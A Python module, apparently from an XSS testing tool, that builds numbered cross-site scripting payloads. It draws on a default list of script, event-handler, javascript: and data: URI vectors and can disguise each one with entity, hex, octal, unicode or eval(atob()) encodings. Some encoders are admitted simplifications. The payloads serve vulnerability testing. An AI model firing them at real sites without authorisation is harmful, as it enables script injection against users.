# xssblaster/core.py
from collections.abc import Generator

from .utils import load_payloads_from_file


def generate_payloads(
    prefix: str = "",
    suffix: str = "",
    encode_prefix: bool = False,
    encode_suffix: bool = False,
    payload_file: str | None = None,
    variant_filters: dict[str, bool] | None = None,
) -> tuple[Generator[tuple[int, str], None, None], int, int]:
    """
    Generate XSS payloads with various encoding techniques.

    Args:
        prefix: Prefix to add to each payload
        suffix: Suffix to add to each payload
        encode_prefix: Whether to encode the prefix
        encode_suffix: Whether to encode the suffix
        payload_file: Path to custom payload file
        variant_filters: Dictionary of variant filters to apply

    Returns:
        Tuple of (payloads_generator, num_base_payloads, total_payloads)
    """
    # Default variant filters if none provided or empty
    if variant_filters is None or not variant_filters:
        variant_filters = {"base": True}

    # Load payloads from file or use comprehensive defaults
    if payload_file:
        base_payloads = load_payloads_from_file(payload_file)
        if not base_payloads:
            pass

    if not payload_file or not base_payloads:
        # Comprehensive default payloads based on common XSS vectors
        base_payloads = [
            # Basic script injection
            "prompt({n})",
            "alert({n})",
            "confirm({n})",
            # Image-based XSS
            "<img src=x onerror=prompt({n})>",
            "<img src=x onerror=alert({n})>",
            "<img/src=x onerror=prompt({n})>",
            "<img src='x' onerror='prompt({n})'>",
            '<img src="x" onerror="prompt({n})">',
            # SVG-based XSS
            "<svg onload=prompt({n})>",
            "<svg/onload=prompt({n})>",
            "<svg onload='prompt({n})'>",
            '<svg onload="prompt({n})">',
            "<svg><script>prompt({n})</script></svg>",
            # Script tag variations
            "<script>prompt({n})</script>",
            "<script src=data:,prompt({n})></script>",
            "<script>eval(String.fromCharCode(112,114,111,109,112,116,40,{n},41))</script>",
            # Event handlers
            "<body onload=prompt({n})>",
            "<div onmouseover=prompt({n})>",
            "<input onfocus=prompt({n}) autofocus>",
            "<select onfocus=prompt({n}) autofocus>",
            "<textarea onfocus=prompt({n}) autofocus>",
            "<keygen onfocus=prompt({n}) autofocus>",
            # JavaScript protocol
            "javascript:prompt({n})",
            "javascript:alert({n})",
            "javascript:eval('prompt({n})')",
            # Data URI
            "data:text/html,<script>prompt({n})</script>",
            "data:text/html;base64,<script>prompt({n})</script>",
            # CSS-based
            "<style>@import'data:,*{x:expression(prompt({n}))}';</style>",
            "<link rel=stylesheet href=data:,*{x:expression(prompt({n}))}>",
            # Form-based
            "<form><button formaction=javascript:prompt({n})>Click",
            "<form><input type=submit formaction=javascript:prompt({n}) value=Click>",
            # Meta refresh
            "<meta http-equiv=refresh content=0;url=javascript:prompt({n})>",
            # Object/embed
            "<object data=javascript:prompt({n})>",
            "<embed src=javascript:prompt({n})>",
            # Template literals
            "`${prompt({n})}`",
            "${prompt({n})}",
            # Unicode variations
            "\\u003cscript\\u003eprompt({n})\\u003c/script\\u003e",
            "\\x3cscript\\x3eprompt({n})\\x3c/script\\x3e",
        ]

    # Define encoding functions
    def jsfuck_encode(s: str) -> str:
        # Simplified JSFuck-style encoding with recognizable patterns
        # Real JSFuck is extremely complex, this is a simplified version
        # For simplicity, just wrap the original string with JSFuck-like syntax
        return f"[][(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]+!+[]]+(!![]+[])[+[]]]({s})"

    def html_entity_encode(s: str) -> str:
        return "".join(f"&#{ord(c)};" for c in s)

    def base64_encode(s: str) -> str:
        import base64

        return base64.b64encode(s.encode()).decode()

    def unicode_escape_encode(s: str) -> str:
        return s.encode("unicode_escape").decode("ascii")

    def hex_encode(s: str) -> str:
        return "".join(f"\\x{ord(c):02x}" for c in s)

    def octal_encode(s: str) -> str:
        return "".join(f"\\{ord(c):03o}" for c in s)

    # Add more encoding functions...

    # Calculate total count upfront
    variants_per_payload = 0
    if variant_filters.get("base", False):
        variants_per_payload += 1
    if variant_filters.get("jsfuck", False):
        variants_per_payload += 1
    if variant_filters.get("html_entity", False):
        variants_per_payload += 1
    if variant_filters.get("base64_encode", False):
        variants_per_payload += 1
    if variant_filters.get("unicode_escape", False):
        variants_per_payload += 1
    if variant_filters.get("hex_encode", False):
        variants_per_payload += 1
    if variant_filters.get("octal_encode", False):
        variants_per_payload += 1
    # Add more variant counts as needed...

    total = len(base_payloads) * variants_per_payload

    # Generate payloads
    counter = 1

    def generate_variants(payload: str) -> Generator[tuple[int, str], None, None]:
        nonlocal counter
        variants = []

        # First replace placeholders in the base payload
        base_with_counter = payload.replace("{n}", str(counter))

        # Apply variant filters to the payload with counter
        if variant_filters.get("base", False):
            variants.append(base_with_counter)

        if variant_filters.get("jsfuck", False):
            variants.append(jsfuck_encode(base_with_counter))

        if variant_filters.get("html_entity", False):
            variants.append(html_entity_encode(base_with_counter))

        if variant_filters.get("base64_encode", False):
            variants.append(f"eval(atob('{base64_encode(base_with_counter)}'))")

        if variant_filters.get("unicode_escape", False):
            variants.append(unicode_escape_encode(base_with_counter))

        if variant_filters.get("hex_encode", False):
            variants.append(hex_encode(base_with_counter))

        if variant_filters.get("octal_encode", False):
            variants.append(octal_encode(base_with_counter))

        # Add more variants based on filters...

        # Generate final payloads
        for variant in variants:
            final = variant
            if encode_prefix:
                final = html_entity_encode(prefix) + final
            else:
                final = prefix + final

            if encode_suffix:
                final = final + html_entity_encode(suffix)
            else:
                final = final + suffix

            yield (counter, final)
            counter += 1

    # Create generator for all payloads
    def payload_generator():
        for payload in base_payloads:
            yield from generate_variants(payload)

    return payload_generator(), len(base_payloads), total
